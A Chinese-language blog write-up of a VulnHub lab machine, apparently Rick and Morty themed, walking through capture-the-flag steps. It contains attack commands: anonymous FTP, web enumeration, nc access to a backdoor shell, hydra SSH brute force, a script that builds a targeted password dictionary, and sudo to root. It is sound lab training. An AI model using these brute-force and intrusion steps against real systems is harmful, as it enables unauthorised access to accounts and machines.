---
title: "VulnHub Ionic Defibrillator 渗透记录：从 FTP 匿名到 sudo 提权"
summary: "一台 Rick and Morty 主题的中级靶机：FTP 匿名、robots.txt 与 cgi-bin、Cockpit、两个后门端口、SSH 爆破，再靠一个 safe 二进制和自制字典拿满九个 Flag。"
category: tech
publishedAt: 2026-10-09
tags: ["VulnHub", "渗透测试", "SSH爆破", "信息收集"]
cover: "/images/post-vulnhub-ionic.webp"
coverAlt: "星河背景下的一台 Linux 靶机"
featured: false
kicker: "靶场复盘"
---

Ionic Defibrillator 是一台 Rick and Morty 主题的中级靶机，一共埋了九个 Flag，散布在 FTP、Web、非常规端口和多个用户的家目录里。整台机器没有单一的“爆点”，而是把信息泄露、弱口令、后门端口和命令参数利用串成一条链。下面按发现的顺序记录。

实验环境：攻击机 Kali（`192.168.136.129`），靶机 `192.168.136.155`。

## 一、信息收集

### 1.1 主机发现

```bash
arp-scan -l
```

在网段内发现一台存活主机 **192.168.136.155**，MAC 属于 VMware 虚拟网卡。

### 1.2 端口扫描

```bash
nmap -A -p- 192.168.136.155
```

开放的端口比预期多得多：

| 端口 | 服务 | 说明 |
|------|------|------|
| 21 | ftp | vsftpd 3.0.3，**允许匿名登录**，目录里有 `FLAG.txt` |
| 22 | ssh | Ubuntu 14.04.5，仅指纹信息 |
| 80 | http | Apache 2.4.27 (Fedora)，标题 Morty's Website，允许 TRACE |
| 9090 | http | Cockpit web service |
| 13337 | unknown | banner 里直接带 Flag |
| 22222 | ssh | OpenSSH 7.5，真正的登录入口 |
| 60000 | unknown | banner 写着 "Welcome to Ricks half baked reverse shell..." |

一台靶机上同时出现三个 SSH 相关端口和两个“未知服务”，基本可以确定后面的突破口就藏在这些非常规端口里。

## 二、FTP 匿名登录

`nmap` 的 `ftp-anon` 脚本已经提示匿名登录被允许。直接连接：

```bash
ftp Anonymous@192.168.136.155
ftp> get FLAG.txt
ftp> exit
cat FLAG.txt
```

```
FLAG{Whoa this is unexpected} - 10 Points
```

## 三、Web 枚举与 robots.txt

对 80 端口做目录枚举：

```bash
dirb http://192.168.136.155
```

在枚举与页面线索中发现一条口令 `winter`，以及一个 Flag：

```
FLAG{Yeah d- just don't do it.} - 10 Points
```

`winter` 先记下，后面 SSH 爆破会用上。

访问 `robots.txt`，内容本身就是一句瑞克和莫蒂的台词，同时泄露了三个路径：

```
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

这两个 `cgi-bin` 脚本名字起得毫不掩饰，属于典型的“约定文件泄露隐藏入口”——`robots.txt` 从来不是访问控制。

## 四、Cockpit 服务（9090）

9090 是 Cockpit 的 Web 管理面板。从页面资源里能看到登录逻辑用 Basic 认证发起请求：

```javascript
var headers = {
  "Authorization": "Basic " + window.btoa(utf8(user + ":" + password)),
  "X-Authorize": authorized,
};
send_login_request("GET", headers, false); // → GET /cockpit/login
```

顺着这条线索取得一个 Flag：

```
FLAG{There is no Zeus, in your face!} - 10 Points
```

## 五、两个“后门”端口

### 5.1 13337 —— banner 里的 Flag

这个端口不做任何交互，连上就把 Flag 当横幅吐出来：

```
FLAG:{TheyFoundMyBackDoorMorty}-10Points
```

### 5.2 60000 —— half baked reverse shell

端口 60000 自称是一个“半成品反弹 shell”，用 `nc` 连上去就能直接拿到命令执行：

```bash
nc -v 192.168.136.155 60000
```

```
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points
```

注意 `#` 提示符——这个 shell 的权限已经相当高，先记住。

## 六、SSH（22222）—— Summer 账户

用枚举到的口令 `winter` 对 22222 端口做定向爆破：

```bash
hydra -l Summer -p winter ssh://192.168.136.155:22222
```

```
[22222][ssh] host: 192.168.136.155   login: Summer   password: winter
```

登录 Summer 账户后，家目录里还有一个 Flag。直接 `cat` 只看到一段 ASCII 小马图案，用 `tac` 反向输出才拿到真正内容：

```bash
[Summer@localhost ~]$ tac FLAG.txt
FLAG{Get off the high road Summer!} - 10 Points
```

## 七、横向：Morty 与 Rick 的家目录

`/home` 下有三个用户：

```
Morty  RickSanchez  Summer
```

### 7.1 Morty —— 加密压缩包

Morty 的家目录里有两个文件：`journal.txt.zip` 和一个 `Safe_Password.jpg`。

```bash
unzip -P Meeseek journal.txt.zip -d /tmp/morty_unzip
tac /tmp/morty_unzip/journal.txt
```

压缩包口令 `Meeseek` 解开后，日志里给出下一个 Flag，同时暗示了一个“保险箱密码”：

```
FLAG: {131333} - 20 Points
```

### 7.2 RickSanchez —— safe 二进制

Rick 的家目录里有 `RICKS_SAFE/` 目录，里面是一个 `safe` 可执行文件。把它复制出来运行，发现必须带参数：

```bash
cp /home/RickSanchez/RICKS_SAFE/safe /tmp/safe_copy
chmod +x /tmp/safe_copy
/tmp/safe_copy
```

```
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
```

把上一步拿到的 `131333` 作为参数传入：

```bash
/tmp/safe_copy 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
```

解密成功后，程序还吐出了 Rick 自己的密码提示：

```
Ricks password hints:
Follow these clues, in order
 1 uppercase character
 1 digit
 One of the words in my old bands name.
```

## 八、提权到 root

老 Rick 的乐队叫 **Flesh Curtains**。按提示“一个大写字母 + 一个数字 + 乐队名里的一个单词”生成字典：

```bash
for letter in {A..Z}; do
  for digit in {0..9}; do
    for word in Flesh Curtains; do
      echo "$letter$digit$word"
    done
  done
done > rick_dict.txt
```

再对 RickSanchez 爆破：

```bash
hydra -l RickSanchez -P rick_dict.txt ssh://192.168.136.155:22222 -t 4
```

```
[22222][ssh] host: 192.168.136.155   login: RickSanchez   password: P7Curtains
```

用 RickSanchez 登录后，直接 `sudo su` 就是 root：

```bash
[root@localhost ~]# tac FLAG.txt
FLAG: {Ionic Defibrillator} - 30 points
```

## 九、Flag 汇总

```
FLAG{Yeah d- just don't do it.}          - 10 Points   # Web / cgi-bin
FLAG{Whoa this is unexpected}            - 10 Points   # FTP 匿名
FLAG:{TheyFoundMyBackDoorMorty}          - 10 Points   # 13337
FLAG {There is no Zeus, in your face!}   - 10 Points   # Cockpit 9090
FLAG{Flip the pickle Morty!}             - 10 Points   # 60000
FLAG{Get off the high road Summer!}      - 10 Points   # Summer 家目录
FLAG: {131333}                           - 20 Points   # Morty 压缩包
FLAG{And Awwwaaaaayyyy we Go!}           - 20 Points   # safe 二进制
FLAG: {Ionic Defibrillator}              - 30 points   # root
```

## 十、小结

这台靶机的价值在于“信息收集要覆盖全部端口和全部用户”：

- FTP 匿名登录、`robots.txt`、Cockpit 面板、两个非标准端口，任何一处漏掉都会断链。
- 低权限账户家目录里常藏着指向下一跳的线索（口令、加密包、二进制提示）。
- 一个以“一个大写字母 + 一个数字 + 一个单词”为规则的弱口令，在定向字典面前几乎等于明文。
- 拿到高权限命令执行（`sudo su`、后门 shell）后，`/root` 的 Flag 只是一步之遥。

`Safe_Password.jpg` 这类疑似隐写素材本次没有展开，可以作为后续复盘的追加练习。
